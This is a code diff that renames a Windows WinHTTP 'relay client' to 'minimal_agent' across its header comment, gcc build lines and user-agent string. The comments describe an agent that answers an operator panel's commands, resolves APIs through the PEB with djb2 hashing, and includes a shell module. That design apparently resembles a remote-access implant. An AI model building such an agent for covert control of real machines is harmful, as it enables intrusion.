@@ -1,4 +1,4 @@
-/* relay_client - a minimal agent for Windows (WinHTTP, 8+).
+/* minimal_agent - a minimal agent for Windows (WinHTTP, 8+).
  *
  * A "minimal agent" in the relay protocol is anything that answers the
  * operator panel's Hello command with a 750-byte identity frame. Everything
@@ -23,7 +23,7 @@
  * the PEB (winhttp_api.c). Two flavors:
  *
  * CRT flavor (development default - links the mingw startup):
- *   gcc -O2 -s -Wall -Wextra -o relay_client.exe main.c \
+ *   gcc -O2 -s -Wall -Wextra -o minimal_agent.exe main.c \
  *       transport.c shell.c report.c system_facts.c winhttp_api.c \
  *       memory.c string.c kernel32.c advapi.c ntdll.c peb.c \
  *       system.c djb2.c logger.c -ladvapi32
@@ -32,7 +32,7 @@
  *   gcc -O2 -c main.c transport.c shell.c report.c system_facts.c \
  *       winhttp_api.c memory.c string.c kernel32.c advapi.c ntdll.c \
  *       peb.c system.c djb2.c logger.c entry.c
- *   gcc -O2 -nostdlib -e entry -o relay_free.exe \
+ *   gcc -O2 -nostdlib -e entry -o minimal_agent_free.exe \
  *       entry.o main.o transport.o shell.o report.o system_facts.o \
  *       winhttp_api.o memory.o string.o kernel32.o advapi.o ntdll.o \
  *       peb.o system.o djb2.o logger.o
@@ -41,8 +41,8 @@
  *  startup contract unresolved)
  *
  * Run:
- *   relay_client.exe <URL>        e.g. ... https://relay.example.com/agent
- *   relay_client.exe <URL> -v     verbose: dump every command's raw bytes
+ *   minimal_agent.exe <URL>        e.g. ... https://relay.example.com/agent
+ *   minimal_agent.exe <URL> -v     verbose: dump every command's raw bytes
  *
  * The URL comes only from the command line; nothing is hardcoded.
  *
@@ -384,7 +384,7 @@ static int run_session(const WCHAR *url, int *long_lived)
            https ? L"https" : L"http", uc.lpszHostName, uc.lpszUrlPath);
     
 
-    session = winhttp.WinHttpOpen(L"relay_client/1.0",
+    session = winhttp.WinHttpOpen(L"minimal_agent/1.0",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!session) { LOG_ERROR("WinHttpOpen failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
